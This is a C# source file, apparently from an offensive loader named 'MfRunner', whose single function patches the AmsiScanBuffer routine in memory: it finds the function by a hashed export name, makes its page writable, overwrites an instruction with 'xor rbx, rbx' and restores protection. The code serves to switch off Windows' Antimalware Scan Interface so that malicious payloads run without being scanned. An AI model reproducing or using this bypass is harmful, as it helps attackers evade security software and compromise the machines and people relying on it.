using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
    internal partial class Program
    {
        public static void PatchAMSI()
        {
            IntPtr AmsiScanBufferAddress = GetExportAddress(AmsiAddress, 0xDE7FB4D9);
            if (AmsiScanBufferAddress == IntPtr.Zero)
                return;

            // Patch at offset +33 bytes with xor rbx, rbx (72 49 219)
            // This is a more targeted patch that modifies a specific instruction
            // rather than replacing the entire function prologue
            IntPtr patchAddress = new IntPtr(AmsiScanBufferAddress.ToInt64() + 33);
            
            // Patch bytes: xor rbx, rbx (x64)
            // 72 = REX.W prefix (64-bit)
            // 49 219 = xor rbx, rbx
            byte[] patchBytes = new byte[] { 0x48, 0x31, 0xDB };
            
            uint oldProtect = 0;
            // Change memory protection to PAGE_EXECUTE_READWRITE (0x40)
            if (CustomVirtualProtect(patchAddress, (UIntPtr)patchBytes.Length, 0x40, out oldProtect))
            {
                // Apply the patch
                CopyFunction(patchAddress, patchBytes);
                
                // Restore memory protection to PAGE_EXECUTE_READ (0x20)
                uint tempProtect = 0;
                CustomVirtualProtect(patchAddress, (UIntPtr)patchBytes.Length, 0x20, out tempProtect);
            }
        }
    }
}
